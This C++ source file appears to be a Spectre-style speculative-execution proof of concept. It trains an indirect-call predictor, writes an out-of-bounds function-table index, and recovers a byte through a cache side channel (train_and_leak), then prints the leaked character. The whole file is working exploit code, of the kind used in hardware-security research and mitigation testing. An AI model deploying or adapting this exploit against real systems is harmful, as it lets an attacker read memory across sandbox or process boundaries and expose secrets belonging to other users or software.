#include <stdint.h>
#include <iostream>
#include "cache_sidechannel.h"
#include "instr.h"
#include "local_content.h"
#include "utils.h"

typedef char(*functype)(int num);

#define SENTINAL1 ((char)1)
#define SENTINAL2 ((char)2)

__attribute__((noinline))
char dummy_func(int v) {
    return SENTINAL1;
}

__attribute__((noinline))
char callIndirect(functype* func, bool* exec) {
    if (*exec) {
        return (*func)(0);
    }
    return SENTINAL2;
}

struct FunctionSlot {
    uint64_t func_type;
    uint64_t func_ptr;
};

__attribute__((noinline))
void flush_function_table_len_addr() {
    const uint64_t function_table_len_addr = (uint64_t) 0x1234567890abcde;
    FlushFromDataCache_HostAddr(function_table_len_addr, function_table_len_addr + 8);
}

// returns the leaked byte value
__attribute__((noinline))
char train_and_leak() {
    CacheSideChannel sidechannel;
    const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
    const unsigned CONVERGE_ITERATIONS = 100000;

    bool* exec = new bool;
    functype* val = new functype;

    // 0. Call once to set up function table addr
    *exec = true;
    *val = dummy_func;
    callIndirect(val, exec);

    for (unsigned run = 0; run < CONVERGE_ITERATIONS; ++run) {

        // 1. train
        *exec = true;
        *val = dummy_func;
        for (int i = 0; i < 100000; i++) {
            callIndirect(val, exec);
        }

        // 2. Flush sidechannel oracle
        sidechannel.FlushOracle();

        // 2b. flush table length address to give some time for speculation
        flush_function_table_len_addr();

        // 3. Use an OOB value for indirect call table, causing OOB speculation exec
        *((uint32_t*) val) = 0x0001000;
        *exec = false;

        // 4. Flush exec
        FlushFromDataCache_GuestAddr(exec - 8, exec + 8);

        MemoryAndSpeculationBarrier();

        // 5. Invoke call indirect
        char c = callIndirect(val, exec);

        // 6. leak c
        if (c != SENTINAL1 && c != SENTINAL2) {
            ForceRead(oracle.data() + c);
        }

        // 7. Speculative work is done. Speculation fence
        MemoryAndSpeculationBarrier();

        // 8. Exfiltrate value from cache
        std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
        if (result.first) {
            // Clean signal, return the value
            return result.second;
        }

        // 9. Whoops, didn't get a clean signal; try again
    }

    // Failed to leak the character in CONVERGE_ITERATIONS tries
    std::cerr << "Does not converge" << std::endl;
    exit(EXIT_FAILURE);
}

__attribute__((noinline))
int main(int argc, char const *argv[])
{
    char leaked = train_and_leak();
    std::cout << "Leaked the character " << leaked << "(charcode: " << (int) leaked << ')' << std::endl;
    return 0;
}
